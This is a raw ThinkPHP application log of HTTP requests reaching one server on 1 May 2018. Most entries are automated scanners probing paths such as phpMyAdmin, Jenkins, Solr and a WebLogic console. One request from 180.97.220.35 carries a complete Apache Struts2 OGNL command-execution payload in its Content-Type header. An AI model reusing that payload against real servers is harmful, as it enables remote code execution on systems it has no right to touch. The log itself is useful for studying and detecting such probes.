[ 2018-05-01T18:46:21+08:00 ] 172.16.0.5 107.170.239.41 GET /
[ log ] 123.207.34.110/ [运行时间：0.015510s][吞吐率：64.47req/s] [内存消耗：1,678.06kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T19:15:12+08:00 ] 172.16.0.5 112.90.82.218 GET /muieblackcat
[ log ] 123.207.34.110/muieblackcat [运行时间：0.012161s][吞吐率：82.23req/s] [内存消耗：1,356.73kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'muieblackcat',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T19:50:28+08:00 ] 172.16.0.5 5.189.150.18 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014492s][吞吐率：69.00req/s] [内存消耗：1,678.13kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'libwww-perl/6.33',
  'host' => '123.207.34.110:80',
  'connection' => 'TE, close',
  'te' => 'deflate,gzip;q=0.3',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T19:55:03+08:00 ] 172.16.0.5 141.212.122.96 GET /
[ log ] 123.207.34.110/ [运行时间：0.016299s][吞吐率：61.35req/s] [内存消耗：1,678.06kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T20:17:31+08:00 ] 172.16.0.5 5.189.150.18 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.017167s][吞吐率：58.25req/s] [内存消耗：1,678.13kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'libwww-perl/6.33',
  'host' => '123.207.34.110:80',
  'connection' => 'TE, close',
  'te' => 'deflate,gzip;q=0.3',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T21:23:07+08:00 ] 172.16.0.5 120.78.180.214 GET /phpMYAdmin/
[ log ] 123.207.34.110/phpMYAdmin/ [运行时间：0.011481s][吞吐率：87.10req/s] [内存消耗：1,358.00kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'phpMYAdmin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://123.207.34.110/phpMYAdmin/',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T22:01:08+08:00 ] 172.16.0.5 180.97.220.35 GET /
[ log ] 123.207.34.110/ [运行时间：0.014350s][吞吐率：69.69req/s] [内存消耗：1,678.28kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'accept' => '*/*',
  'user-agent' => 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T22:01:08+08:00 ] 172.16.0.5 180.97.220.35 GET /index.action
[ log ] 123.207.34.110/index.action [运行时间：0.011766s][吞吐率：84.99req/s] [内存消耗：1,360.37kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'echo windows--2017\'}:{\'/bin/bash\',\'-c\',\'echo linux--2017\'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T22:10:01+08:00 ] 172.16.0.5 119.147.207.152 GET /
[ log ] 123.207.34.110/ [运行时间：0.019955s][吞吐率：50.11req/s] [内存消耗：1,679.08kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T23:01:08+08:00 ] 172.16.0.5 101.226.35.225 GET /skins/vector/csshover.htc
[ log ] 123.207.34.110/skins/vector/csshover.htc [运行时间：0.013703s][吞吐率：72.98req/s] [内存消耗：1,360.49kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'skins',
    1 => 'vector',
    2 => 'csshover.htc',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://123.207.34.110:80/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T23:01:13+08:00 ] 172.16.0.5 101.226.35.225 GET /rockmongo/
[ log ] 123.207.34.110/rockmongo/ [运行时间：0.013392s][吞吐率：74.67req/s] [内存消耗：1,360.34kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'rockmongo',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://123.207.34.110:80/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T23:01:14+08:00 ] 172.16.0.5 101.226.35.225 GET /server-status
[ log ] 123.207.34.110/server-status [运行时间：0.012717s][吞吐率：78.63req/s] [内存消耗：1,360.30kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'server-status',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://123.207.34.110:80/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T23:01:15+08:00 ] 172.16.0.5 101.226.35.225 GET /wikilib.d/PmWiki.ChangeLog
[ log ] 123.207.34.110/wikilib.d/PmWiki.ChangeLog [运行时间：0.015132s][吞吐率：66.08req/s] [内存消耗：1,360.51kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wikilib.d',
    1 => 'PmWiki.ChangeLog',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://123.207.34.110:80/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T23:01:15+08:00 ] 172.16.0.5 101.226.35.225 GET /4e5e5d7364f443e28fbf0d3ae744a59a
[ log ] 123.207.34.110/4e5e5d7364f443e28fbf0d3ae744a59a [运行时间：0.013872s][吞吐率：72.09req/s] [内存消耗：1,360.45kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '4e5e5d7364f443e28fbf0d3ae744a59a',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://123.207.34.110:80/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T23:01:16+08:00 ] 172.16.0.5 101.226.35.225 GET /jenkins/
[ log ] 123.207.34.110/jenkins/ [运行时间：0.012530s][吞吐率：79.81req/s] [内存消耗：1,360.33kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'jenkins',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://123.207.34.110:80/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T23:01:17+08:00 ] 172.16.0.5 101.226.35.225 GET /console/login/LoginForm.jsp
[ log ] 123.207.34.110/console/login/LoginForm.jsp [运行时间：0.012658s][吞吐率：79.00req/s] [内存消耗：1,360.49kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'console',
    1 => 'login',
    2 => 'LoginForm.jsp',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://123.207.34.110:80/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T23:01:17+08:00 ] 172.16.0.5 101.226.35.225 GET /solr/
[ log ] 123.207.34.110/solr/ [运行时间：0.011953s][吞吐率：83.66req/s] [内存消耗：1,360.30kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'solr',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://123.207.34.110:80/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T23:01:18+08:00 ] 172.16.0.5 101.226.35.225 GET /
[ log ] 123.207.34.110/ [运行时间：0.015572s][吞吐率：64.22req/s] [内存消耗：1,681.41kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://123.207.34.110:80/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'keep-alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-01T23:01:18+08:00 ] 172.16.0.5 101.226.35.225 GET /
[ log ] 123.207.34.110/ [运行时间：0.014143s][吞吐率：70.71req/s] [内存消耗：1,678.37kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-requests/2.11.1',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
